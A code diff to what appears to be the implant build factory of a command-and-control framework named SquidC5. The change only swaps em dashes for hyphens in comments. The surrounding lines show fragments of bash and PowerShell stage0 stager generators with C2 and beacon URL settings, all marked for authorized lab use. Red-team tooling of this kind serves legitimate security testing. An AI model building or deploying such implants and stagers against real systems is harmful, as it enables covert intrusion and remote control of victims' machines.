@@ -1,4 +1,4 @@
-"""Implant build factory — emits build scripts, config blob, stagers (authorized only)."""
+"""Implant build factory - emits build scripts, config blob, stagers (authorized only)."""
 
 from __future__ import annotations
 
@@ -129,7 +129,7 @@ def build_plan(
     build_sh = textwrap.dedent(
         f"""\
         #!/bin/sh
-        # SquidC5 implant factory — authorized use only
+        # SquidC5 implant factory - authorized use only
         set -e
         cd "$(dirname "$0")/../../agents/sc5beacon" 2>/dev/null || cd agents/sc5beacon
         go mod tidy
@@ -167,7 +167,7 @@ def build_plan(
         "notes": [
             "Prefer SC5_CONFIG_B64 over individual env vars",
             "Copy server data/implant_psk.txt into SC5_PSK (never commit)",
-            "TLS verify on — install lab CA or use trusted certs",
+            "TLS verify on - install lab CA or use trusted certs",
             "Authorized testing only",
         ],
         "agent_path": "agents/sc5beacon",
@@ -189,7 +189,7 @@ def generate_stage0_bash(
     return textwrap.dedent(
         f"""\
         #!/bin/bash
-        # SquidC5 stage0 stager (bash) — authorized lab only
+        # SquidC5 stage0 stager (bash) - authorized lab only
         set -euo pipefail
         C2={json.dumps(base)}
         BEACON_URL={json.dumps(url)}
@@ -221,7 +221,7 @@ def generate_stage0_ps1(
     url = stage_url or f"{base}/api/v1/implant/beacon"
     return textwrap.dedent(
         f"""\
-        # SquidC5 stage0 stager (PowerShell) — authorized lab only
+        # SquidC5 stage0 stager (PowerShell) - authorized lab only
         $ErrorActionPreference = "Stop"
         $env:SC5_URL = {json.dumps(url)}
         if (-not $env:SC5_PSK) {{ throw "Set SC5_PSK from teamserver implant_psk.txt" }}
